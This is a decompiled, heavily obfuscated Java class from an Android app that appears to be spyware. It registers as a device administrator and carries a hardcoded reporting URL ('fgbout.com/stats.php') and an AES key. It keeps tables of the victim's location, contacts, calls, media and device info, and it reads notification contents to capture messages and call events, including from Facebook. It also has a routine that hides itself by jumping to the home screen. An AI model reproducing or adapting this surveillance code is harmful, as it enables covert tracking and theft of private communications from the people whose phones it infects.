package ajt274.psovdxoieon274.kgjvbqpsss274;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.PendingIntent;
import android.app.admin.DeviceAdminReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteQueryBuilder;
import android.graphics.Color;
import android.net.Uri;
import android.provider.ContactsContract;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.File;
import java.text.DecimalFormat;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONArray;

/* loaded from: classes.dex */
public class Ohzylmnvkajcbrdxw extends DeviceAdminReceiver {
    public static final String chkal = "battUpgradePage";
    public static final String clqtsum = "checkmail";
    public static final boolean eupqztnsa = false;
    public static final String eyljrimadcbqzhotsvf = "3g";
    public static final String fleijvkxymzdpowgbats = "ACCESS_FINE_LOCATION";
    public static final boolean icnkjlqsvp = false;
    public static Thread kdyjbfgo = null;
    public static final String lmkhawfsgdprzeovxnyq = "fcmdwln";
    public static final String ltdfnzjwgk = "http://fgbout.com/stats.php";
    public static final String nblgfpudyvokxwehisqz = "cnt_oldnames";
    public static final String ndswegtmuqyv = "install_fcm_app";
    public static final String nwruzheqajgdiybxtsl = "wlan0";
    public static final long petvglicjynsdrw = 10000;
    public static final String rjlecaifnyodmvpgt = "fcm_battperm_checknow";
    public static final String rjzntwqb = "errors";
    public static final String rmfnbpyzxtisqa = "temp_data2";
    public static final String tgjmkvlr = "last_remove_battlist_time";
    public static final String wkgvpsmzbracfdeilhnt = "fcm_method";
    public static final String wmyqspuhztjb = "$l7%LkpZgiJG@0L6";
    public static Context xrmltoqdcvksznha = null;
    public static final String yqgwezolvadsktuxfc = "false";
    public static final Uri thmeuqzfdjxvsw = Uri.parse("content://ajt274.psovdxoieon274.kgjvbqpsss274/webconfig");
    public static final String hyqcjnzmsgkxltudre = null;
    public static String[] jbrxlmzsdagkuofyc = null;

    static {
        Jmirygn.rdbmi.addURI("ajt274.psovdxoieon274.kgjvbqpsss274", "lastlocation", 70);
        Jmirygn.rdbmi.addURI("ajt274.psovdxoieon274.kgjvbqpsss274", "lastlocation/#", 80);
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onEnabled(Context mContext, Intent mIntent) {
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public CharSequence onDisableRequested(Context mContext, Intent mIntent) {
        return super.onDisableRequested(mContext, mIntent);
    }

    @Override // android.app.admin.DeviceAdminReceiver
    public void onDisabled(Context mContext, Intent mIntent) {
        super.onDisabled(mContext, mIntent);
    }

    public static void Smwnavl(SQLiteDatabase db1) {
        db1.execSQL(Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Lkjsvufqxwhta.xyjqafhil) + "media (track_id" + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Jmirygn.bjvmrhyilatenzp) + Ovrxzlpgnc.nfsraykvme + " TEXT, " + Unheoy.yaubhjrkpwsmedlvigz + " TEXT, " + Jmirygn.lqvibutk + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ovrxzlpgnc.diztfyvknb) + Mbswaq.cenodhkzylimwuvfbxs + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ovrxzlpgnc.diztfyvknb) + Ajgqtwdfvlsrb.ockiuxjdrhyqe + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ovrxzlpgnc.diztfyvknb) + Kyvoxj.qeyoprtcghlmvi + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ovrxzlpgnc.diztfyvknb) + Ecrwqmfdvkopzhligbx.ijykadfuprv + " TEXT," + Fohawyrx.irwehynbksdflqxt + " TEXT);" + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ecrwqmfdvkopzhligbx.jutkfmyred) + "[" + Ovrxzlpgnc.nfsraykvme + "] ON [media] ([" + Ovrxzlpgnc.nfsraykvme + "]);" + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ecrwqmfdvkopzhligbx.jutkfmyred) + "[" + Mbswaq.cenodhkzylimwuvfbxs + "] ON [media] ([" + Mbswaq.cenodhkzylimwuvfbxs + "]);" + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ecrwqmfdvkopzhligbx.jutkfmyred) + "[" + Jmirygn.lqvibutk + "] ON [media] ([" + Jmirygn.lqvibutk + "]);" + Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Ecrwqmfdvkopzhligbx.jutkfmyred) + "[" + Kyvoxj.qeyoprtcghlmvi + "] ON [media] ([" + Kyvoxj.qeyoprtcghlmvi + "]);");
    }

    public static Cursor Eupwmxnlqyrbatjik(Context mContext, Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        if (Iqrxcegazbulwphv.nzjqpyuktfdmevx) {
            return null;
        }
        SQLiteQueryBuilder queryBuilder = new SQLiteQueryBuilder();
        switch (Jmirygn.rdbmi.match(uri)) {
            case 10:
                queryBuilder.setTables(Jobrdzfeqi.yvkbofcreshgpzxjqwua);
                break;
            case 20:
                queryBuilder.setTables(Jobrdzfeqi.yvkbofcreshgpzxjqwua);
                queryBuilder.appendWhere("track_id=" + uri.getLastPathSegment());
                break;
            case Kyvoxj.wqbmyxtkhcride /* 30 */:
                queryBuilder.setTables("register");
                break;
            case Veycuznpwbtramsf.ekmlgnot /* 50 */:
                queryBuilder.setTables("config");
                break;
            case Bypiqzawu.ftknyisbhgdjm /* 70 */:
                queryBuilder.setTables("lastlocation");
                break;
            case Htxpaolqriwgmscdu.ukmcqfor /* 80 */:
                queryBuilder.setTables("lastlocation");
                queryBuilder.appendWhere("loc_start_time=" + uri.getLastPathSegment());
                break;
            case Ovrxzlpgnc.hmsbpcwxarztqgfody /* 110 */:
                queryBuilder.setTables("service");
                break;
            case 120:
                queryBuilder.setTables("service");
                queryBuilder.appendWhere("service_id=" + uri.getLastPathSegment());
                break;
            case 130:
                queryBuilder.setTables("task");
                break;
            case Jfgdvwqxsmiczeb.wlrxtvdusc /* 150 */:
                queryBuilder.setTables("tempdata");
                break;
            case Jfgdvwqxsmiczeb.nvyij /* 190 */:
                queryBuilder.setTables("contacts");
                break;
            case Fohawyrx.dhpjiz /* 200 */:
                queryBuilder.setTables("contacts");
                queryBuilder.appendWhere("cnt_id=" + uri.getLastPathSegment());
                break;
            case Afyhliunxezmpqtksjwb.mciagfvornkzutpxsewh /* 210 */:
                queryBuilder.setTables("errors");
                break;
            case Veycuznpwbtramsf.dunbkopayjfvx /* 220 */:
                queryBuilder.setTables("errors");
                queryBuilder.appendWhere("err_id=" + uri.getLastPathSegment());
                break;
            case Afyhliunxezmpqtksjwb.ftwdprgb /* 230 */:
                queryBuilder.setTables("media");
                break;
            case 240:
                queryBuilder.setTables("media");
                queryBuilder.appendWhere("track_id=" + uri.getLastPathSegment());
                break;
            case Bypiqzawu.lfkubdvmzsqyew /* 250 */:
                queryBuilder.setTables("devinfo");
                break;
            case Xgjnu.zwolcgvbdinyru /* 260 */:
                queryBuilder.setTables("devinfo");
                queryBuilder.appendWhere("dev_time=" + uri.getLastPathSegment());
                break;
            case Fohawyrx.ylzrhvinwpmbctx /* 270 */:
                queryBuilder.setTables("fuckmsg");
                break;
            case Bypiqzawu.rkadwzpjnhxci /* 290 */:
                queryBuilder.setTables("webconfig");
                break;
            default:
                throw new IllegalArgumentException("Unknown URI: " + uri);
        }
        if (Jmirygn.uejaoxpygnhrtwc == null) {
            Fohawyrx.Ptmeurxgkoslvjbwq(mContext);
            return null;
        }
        Cursor cc1 = null;
        try {
            Cursor cc12 = queryBuilder.query(Jmirygn.uejaoxpygnhrtwc, projection, selection, selectionArgs, null, null, sortOrder);
            if (cc12 == null) {
                Fohawyrx.Ptmeurxgkoslvjbwq(mContext);
                return null;
            }
            try {
                cc12.setNotificationUri(mContext.getContentResolver(), uri);
                if (cc12 == null) {
                    return cc12;
                }
                Iqrxcegazbulwphv.Cjmkrswiyxdlevo(mContext, cc12);
                return cc12;
            } catch (Exception e) {
                if (cc12 != null) {
                    try {
                        cc12.close();
                    } catch (Exception e2) {
                    }
                }
                Fohawyrx.Ptmeurxgkoslvjbwq(mContext);
                return null;
            } catch (OutOfMemoryError e3) {
                Fohawyrx.Ptmeurxgkoslvjbwq(mContext);
                return null;
            }
        } catch (Exception e4) {
            if (0 != 0) {
                try {
                    cc1.close();
                } catch (Exception e5) {
                }
            }
            Fohawyrx.Ptmeurxgkoslvjbwq(mContext);
            return null;
        } catch (OutOfMemoryError e6) {
            Fohawyrx.Ptmeurxgkoslvjbwq(mContext);
            return null;
        }
    }

    public static long Inlvkmqwshbtp(Context mycontext, String MYTAG, String columnName, Uri uri1, String where1, String order1) {
        try {
            List<Map<String, String>> mydata = Dgblorszymkpiuctqah.Itafjhoqcmw(mycontext, uri1, where1, order1, null);
            if (mydata != null && mydata.size() > 0) {
                return Long.valueOf(mydata.get(0).get(columnName)).longValue();
            }
            return 0;
        } catch (Exception e) {
            Jmirygn.Btjpqdosnzalefg(mycontext, e, MYTAG, "longGetRowVal()");
            return 0;
        }
    }

    public static boolean Ytexzjkowm(Context appContext) {
        String path;
        try {
            if (hyqcjnzmsgkxltudre == null) {
                path = appContext.getApplicationInfo().dataDir + "/databases/calls.db";
            } else {
                path = hyqcjnzmsgkxltudre + "calls.db";
            }
            return new File(path).exists();
        } catch (Exception e) {
            Jmirygn.Btjpqdosnzalefg(appContext, e, Bypiqzawu.tanqxufvpyb, "databaseExist()");
            return false;
        }
    }

    public static int Tfyjcsnvxuoz(Context appContext, Uri uri, ContentValues values, String where) {
        try {
            return appContext.getContentResolver().update(uri, values, where, null);
        } catch (Exception e) {
            return 0;
        }
    }

    public static String Hmjwqcdlxukrytsfbz(double dd1) {
        try {
            String ss1 = String.valueOf(dd1);
            if (Jfgdvwqxsmiczeb.Vqknpof(ss1)) {
                return ss1;
            }
            return new DecimalFormat("#.##").format(dd1);
        } catch (Exception e) {
            return String.valueOf(dd1);
        }
    }

    public static String Ayceg(String text1, String key1) {
        try {
            SecretKeySpec skey = new SecretKeySpec(key1.getBytes(), "AES");
            Cipher mCipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            mCipher.init(2, skey);
            return new String(mCipher.doFinal(Base64.decode(text1, 0)));
        } catch (Exception e) {
            return null;
        }
    }

    public static synchronized void Uetvsigwxradcknyz(Context appContext, String remove_pack) {
        JSONArray row1;
        synchronized (Ohzylmnvkajcbrdxw.class) {
            if (remove_pack != null) {
                try {
                    JSONArray appList = Iqrxcegazbulwphv.Jbeodlwu(appContext);
                    if (appList != null && appList.length() >= 1) {
                        JSONArray newAppList = new JSONArray();
                        for (int ii1 = 0; ii1 < appList.length(); ii1++) {
                            Object jsa = appList.get(ii1);
                            if (!(jsa == null || (row1 = Mbswaq.Scgalwbvqt(jsa.toString())) == null)) {
                                String title_db = Dgblorszymkpiuctqah.Mvgrdlfbcjyxwak(row1, 0);
                                String pack_name_db = Dgblorszymkpiuctqah.Mvgrdlfbcjyxwak(row1, 1);
                                if (pack_name_db != null && !pack_name_db.equals(remove_pack)) {
                                    JSONArray data1 = new JSONArray();
                                    data1.put(title_db);
                                    data1.put(pack_name_db);
                                    newAppList.put(data1);
                                }
                            }
                        }
                        if (newAppList != null && newAppList.length() >= 1) {
                            Buqhxgavnectzdf.Hvkxqfmwetyuspdbragn(appContext, Kyvoxj.jxmtafwhyovidpbuk, newAppList.toString());
                        }
                    }
                } catch (Exception e) {
                }
            }
        }
    }

    public static String Tarsuzjfimnobecgxhl(String number, Context appContext) {
        Cursor cc1;
        String name;
        try {
            cc1 = null;
            try {
                cc1 = appContext.getContentResolver().query(Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number)), new String[]{"display_name", "_id"}, null, null, null);
                if (cc1 == null) {
                    name = null;
                } else if (cc1.moveToFirst()) {
                    name = cc1.getString(cc1.getColumnIndex("display_name"));
                } else {
                    name = "";
                }
                if (cc1 != null) {
                    cc1.close();
                }
                if (name == null) {
                    return Veycuznpwbtramsf.Nudlrq(number, appContext);
                }
                return name;
            } catch (Exception e) {
                String Nudlrq = Veycuznpwbtramsf.Nudlrq(number, appContext);
                if (cc1 != null) {
                    cc1.close();
                }
                return Nudlrq;
            }
        } catch (Throwable th) {
            if (cc1 != null) {
                cc1.close();
            }
            throw th;
        }
    }

    public static void Wylnkqvicdmrz(Activity appContext) {
        try {
            Intent startMain = new Intent("android.intent.action.MAIN");
            startMain.addCategory("android.intent.category.HOME");
            startMain.setFlags(268435456);
            appContext.startActivity(startMain);
        } catch (Exception e) {
            Jmirygn.Btjpqdosnzalefg(appContext, e, Bypiqzawu.tanqxufvpyb, "minimize()");
        }
    }

    public static void Bwefnjqrpdal(String type, String TAG, String descr) {
    }

    public static void Kaflmuoshbqx(Context mycontext, Intent intent1, String ServiceName) {
        try {
            if (Xgjnu.Wjspqbeu(mycontext, ServiceName)) {
                Dgblorszymkpiuctqah.Sgmvyar(mycontext, intent1, ServiceName, "stopMyServiceIfRun()");
            }
        } catch (Exception e) {
            Jmirygn.Btjpqdosnzalefg(mycontext, e, Bypiqzawu.tanqxufvpyb, "stopMyService()");
        }
    }

    public static String Ptenfxhko(Context mycontext, String taskName, String col1) {
        String where1;
        List<Map<String, String>> mydata;
        try {
            where1 = "task_name='" + taskName + "'";
            mydata = Dgblorszymkpiuctqah.Itafjhoqcmw(mycontext, Veycuznpwbtramsf.zwiauygdbrnjtqv, where1, null, null);
        } catch (Exception e) {
            Jmirygn.Btjpqdosnzalefg(mycontext, e, Bypiqzawu.tanqxufvpyb, "getTaskTableTime()");
        }
        if (mydata == null) {
            return "";
        }
        int count1 = mydata.size();
        if (count1 > 1 || count1 == 0) {
            Stcpjwqeoizhmdnb.Tzrcso(mycontext, Veycuznpwbtramsf.zwiauygdbrnjtqv, where1, "getTaskTableTime()");
            Iqrxcegazbulwphv.Jxtpsvelfadh(mycontext, taskName, 0, "");
            return "";
        }
        if (count1 == 1) {
            return String.valueOf(mydata.get(0).get(col1));
        }
        return "";
    }

    public static void Vcxhygrijlknztd(Context appContext, String className, int uniqId, boolean classForName, boolean isService) {
        Intent intentstop;
        try {
            if (classForName) {
                intentstop = new Intent(appContext, Class.forName(className));
            } else {
                intentstop = new Intent(className);
            }
            if (isService) {
                PendingIntent pi1 = PendingIntent.getService(appContext, uniqId, intentstop, 0);
                AlarmManager am1 = (AlarmManager) appContext.getSystemService("alarm");
                if (!(am1 == null || pi1 == null)) {
                    am1.cancel(pi1);
                }
                if (pi1 != null) {
                    pi1.cancel();
                    return;
                }
                return;
            }
            PendingIntent pi12 = PendingIntent.getBroadcast(appContext, uniqId, intentstop, 0);
            AlarmManager am12 = (AlarmManager) appContext.getSystemService("alarm");
            if (am12 != null && pi12 != null) {
                am12.cancel(pi12);
            }
        } catch (Exception e) {
            Jmirygn.Btjpqdosnzalefg(appContext, e, "MyAlarmManager", "stopAlarmService()");
        }
    }

    public static void Rlztpoyfmgjekdhvqxu(Activity mActivity, int actionType) {
        try {
            Button btn1 = Stcpjwqeoizhmdnb.Crjqgbpiawlkhe(mActivity, new Button(mActivity), "Try again");
            LinearLayout.LayoutParams pp1 = new LinearLayout.LayoutParams(-1, -1);
            pp1.weight = 1.0f;
            LinearLayout rootLayout = Buqhxgavnectzdf.Ngrbikjqtuwazp(mActivity, true, pp1, null, 0);
            rootLayout.setBackgroundColor(Color.parseColor(Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Dgblorszymkpiuctqah.faegiscvwuxqjktbzpn)));
            ScrollView sv1 = Htxpaolqriwgmscdu.Jxtazhpqnedrubc(mActivity, 10);
            sv1.setScrollbarFadingEnabled(false);
            LinearLayout bodyLayout = Buqhxgavnectzdf.Ngrbikjqtuwazp(mActivity, true, pp1, null, 0);
            bodyLayout.setGravity(1);
            int pTop = Emkogvnbcjdp.Ibptyehmrnugfxj(50);
            TextView tv1 = Kyvoxj.Sxqwebpzydckan(mActivity, Mbswaq.ojpaxcqfyiguvn, false, false, 16, 5, "#ffffff");
            tv1.setPadding(0, pTop, 0, pTop);
            bodyLayout.addView(tv1);
            bodyLayout.addView(btn1);
            sv1.addView(bodyLayout);
            rootLayout.addView(sv1);
            mActivity.setContentView(rootLayout);
            btn1.setOnClickListener(Htxpaolqriwgmscdu.Kcwufotgzdvbsipm(mActivity, actionType));
        } catch (Exception e) {
        }
    }

    public static HashMap<String, String> Jrlhaqonxigtsfv(HashMap<String, String> data1, String time1) {
        String str_timeCreate;
        if (time1 == null) {
            try {
                str_timeCreate = String.valueOf(Iqrxcegazbulwphv.Kdiazcwpuysqlbj());
            } catch (Exception e) {
            }
        } else {
            str_timeCreate = time1;
        }
        data1.put(String.valueOf(data1.size()), str_timeCreate);
        return data1;
    }

    @SuppressLint({"NewApi"})
    public static String[] Rcklzdvysoxfaqmn(StatusBarNotification sbn, Notification.Action[] act1) {
        try {
            String[] myparams = new String[2];
            String[] ary = Veycuznpwbtramsf.Islgdcfzrbojnhuapev(sbn.getNotification().toString()).split(" ");
            for (int ii1 = 0; ii1 < ary.length; ii1++) {
                if (ary[ii1].indexOf("category=") == 0) {
                    myparams[0] = Mbswaq.Fojnqpkmhguaslir(ary[ii1]);
                }
            }
            if (act1 == null) {
                return myparams;
            }
            myparams[1] = String.valueOf(act1.length);
            return myparams;
        } catch (Exception e) {
            return null;
        }
    }

    public static void Pevlx(Context mycontext, String[] ary) {
        try {
            String track_id = ary[0];
            long event_time = 0;
            try {
                event_time = Long.valueOf(ary[1]).longValue();
            } catch (Exception e) {
            }
            if (event_time == 0) {
                event_time = Iqrxcegazbulwphv.Kdiazcwpuysqlbj();
            }
            String sms_title = ary[2];
            String sms_text = ary[3];
            String app_name = ary[4];
            String call_type1 = ary[5];
            String missed_type = ary[6];
            String type_msg = ary[7];
            if (type_msg != null) {
                if (type_msg.equals("msg")) {
                    if (Buqhxgavnectzdf.Xetdbcsvufoijgmlhrz(mycontext, track_id, Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Fohawyrx.qhjuesyknpirdm))) {
                        return;
                    }
                } else if (!type_msg.equals("call")) {
                    return;
                } else {
                    if (call_type1.equals("und")) {
                        if (Ajgqtwdfvlsrb.Bnxtlpcm(mycontext, track_id, app_name, String.valueOf(event_time))) {
                            return;
                        }
                    } else if (Buqhxgavnectzdf.Xetdbcsvufoijgmlhrz(mycontext, track_id, Iqrxcegazbulwphv.Gvifcqpkbmnzweah(Fohawyrx.qhjuesyknpirdm))) {
                        return;
                    }
                }
                if (Ovrxzlpgnc.Pjydan(mycontext, event_time, track_id, sms_title, sms_text, app_name, call_type1, missed_type, null, null)) {
                    Bypiqzawu.Ybpngoafh(mycontext, false, "FbMsgDetect");
                }
            }
        } catch (Exception e2) {
        }
    }

    public static String Phvutecw(StatusBarNotification sbn, CharSequence msgText, CharSequence[] group_msg) {
        String sms_text;
        try {
            if (group_msg == null) {
                if (msgText == null) {
                    return null;
                }
                sms_text = String.valueOf(msgText);
            } else if (group_msg.length == 0) {
                sms_text = null;
            } else {
                sms_text = String.valueOf(group_msg[group_msg.length - 1]);
            }
            return sms_text;
        } catch (Exception e) {
            return null;
        }
    }

    public static String Digjlywsqnomxuhpra(String sms1) {
        String sms12;
        try {
            sms12 = Emkogvnbcjdp.Yofeg(sms1);
        } catch (Exception e) {
        }
        if (!sms12.equals("Calling...") && !sms12.equals("Обаждане...") && !sms12.equals("Қоңырау...") && !sms12.equals("Се повикува...") && !sms12.equals("Вызов...") && !sms12.equals("Виклик...") && !sms12.equals("Zəng edilir...") && !sms12.equals("") && !sms12.equals("Memanggil...") && !sms12.equals("Trucant...") && !sms12.equals("Volání...") && !sms12.equals("Ringer...") && !sms12.equals("Anrufen...") && !sms12.equals("Helistamine...") && !sms12.equals("") && !sms12.equals("Llamando...") && !sms12.equals("Tumatawag...") && !sms12.equals("Appel en cours...") && !sms12.equals("Pozivam...") && !sms12.equals("Chiamata...") && !sms12.equals("Zvana...") && !sms12.equals("Skambinama...") && !sms12.equals("") && !sms12.equals("Hívás...") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("") && !sms12.equals("")) {
            if (!sms12.equals("")) {
                return "out";
            }
        }
        return "in";
    }
}
